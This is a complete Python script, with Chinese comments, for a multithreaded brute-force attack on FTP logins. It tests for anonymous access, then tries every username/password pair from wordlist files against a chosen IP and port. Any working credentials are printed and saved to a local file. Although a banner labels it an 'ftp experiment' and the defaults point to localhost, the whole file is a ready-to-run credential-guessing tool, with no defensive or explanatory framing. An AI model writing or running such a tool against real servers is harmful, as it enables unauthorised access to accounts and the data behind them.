#!/usr/bin/python3
# -*- coding: utf-8 -*-

import ftplib
import os
import optparse
import threading

class ThreadWork(threading.Thread):
    def __init__(self, ip, username_block, password_block, port):
        """
        类的构造函数，初始化 IP 地址、用户名块、密码块和端口号
        """
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = int(port)
        self.username_block = username_block
        self.password_block = password_block

    def start(self):
        """
        遍历用户名和密码块，调用 run 方法进行爆破
        """
        for user_item in self.username_block:
            for pwd_item in self.password_block:
                self.run(user_item, pwd_item)

    def run(self, username, password):
        """
        根据传入的用户名和密码进行 FTP 登录尝试
        """
        try:
            # 显示正在尝试的用户名和密码
            print(f'[-]checking user[{username}],password[{password}]')
            # 创建 FTP 连接对象
            f = ftplib.FTP(self.ip)
            # 连接到 FTP 服务器
            f.connect(self.ip, self.port, timeout=15)
            # 尝试登录
            f.login(username, password)
            # 关闭 FTP 连接
            f.quit()
            # 登录成功，显示用户名和密码，并写入结果文件
            print ("\n[+] 成功找到凭证。")
            print (f"\n[+] 用户名 : {username}")
            print (f"\n[+] 密码 : {password}")
            with open('result', 'a') as resultFile:
                resultFile.write(f"success!!! username: {username}, password: {password}")
            # 正常退出程序
            os._exit(0)
        # 捕获账号密码错误异常
        except ftplib.error_perm:
            pass

# 列表分块函数
def partition(lst, num):
    """
    将列表按指定数量进行分块
    """
    # 计算每个子列表的长度
    step = int(len(lst) / num)
    # 若子列表不够除为 0 时，将 step 设置为子线程数
    if step == 0:
        step = num
    # 分割列表
    part_list = [lst[i:i+step] for i in range(0, len(lst), step)]
    return part_list

def check_anonymous(ftp_server):
    """
    检查 FTP 服务器是否允许匿名登录
    """
    try:
        # 显示正在尝试匿名登录
        print('[-] 正在检查用户 [anonymous] 密码 [anonymous]')
        # 创建 FTP 连接对象
        f = ftplib.FTP(ftp_server)
        # 连接到 FTP 服务器
        f.connect(ftp_server, 21, timeout=10)
        # 尝试匿名登录
        f.login()
        # 登录成功，显示用户名和密码，并写入结果文件
        print ("\n[+] 成功找到凭证。")
        print ("\n[+] 用户名 : anonymous")
        print ("\n[+] 密码 : anonymous")
        with open('result', 'a') as resultFile:
            resultFile.write("success!!! username: anonymous, password: anonymous")
        # 关闭 FTP 连接
        f.quit()
    except ftplib.all_errors:
        pass

def ftp_exploit(ip, username_file, password_file, thread_number, ftp_port):
    """
    对 FTP 服务器进行暴力破解
    """
    print("============爆破信息============")
    print(f"IP:{ip}")
    print(f"用户名文件:{username_file}")
    print(f"密码文件:{password_file}")
    print(f"线程数:{thread_number}")
    print(f"端口:{ftp_port}")
    print("=================================")
    # 检查是否允许匿名登录
    check_anonymous(ip)
    # 读取用户名和密码文件，存储到列表中
    list_username = [line.strip() for line in open(username_file)]
    list_password = [line.strip() for line in open(password_file)]
    # 对用户名和密码列表进行分块处理
    block_username = partition(list_username, thread_number)
    block_password = partition(list_password, thread_number)
    threads = []
    # 为每个用户名和密码子块创建线程
    for son_user_block in block_username:
        for son_pwd_block in block_password:
            # 实例化任务
            work = ThreadWork(ip, son_user_block, son_pwd_block, ftp_port)
            # 创建线程
            work_thread = threading.Thread(target=work.start)
            # 将线程添加到线程列表中
            threads.append(work_thread)
    # 启动所有线程
    for t in threads:
        t.start()
    # 等待所有线程完成
    for t in threads:
        t.join()

if __name__ == '__main__':
    print("\n#####################################")
    print("#          ftp experiment           #")
    print("#####################################\n")
    # 创建命令行参数解析器
    parser = optparse.OptionParser('示例: python %prog -i 127.0.0.1 -u ./username -p ./password -t 20 -P 21\n')
    # 添加 FTP 地址参数 -i
    parser.add_option('-i', '--ip', dest='targetIP',
                      default='127.0.0.1', type='string',
                      help='FTP 服务器 IP')
    # 添加线程参数 -t
    parser.add_option('-t', '--threads', dest='threadNum',
                      default=10, type='int',
                      help='线程数量 [默认 = 10]')
    # 添加用户名文件参数 -u
    parser.add_option('-u', '--username', dest='userName',
                      default='./username', type='string',
                      help='用户名文件')
    # 添加密码文件参数 -p
    parser.add_option('-p', '--password', dest='passWord',
                      default='./passwords', type='string',
                      help='密码文件')
    # 添加 FTP 端口参数 -P
    parser.add_option('-P', '--port', dest='port',
                      default='21', type='string',
                      help='FTP 端口')
    # 解析命令行参数
    (options, args) = parser.parse_args()
    try:
        # 启动 FTP 暴力破解
        ftp_exploit(options.targetIP, options.userName, options.passWord, options.threadNum, options.port)
    except:
        # 异常退出程序
        exit(1)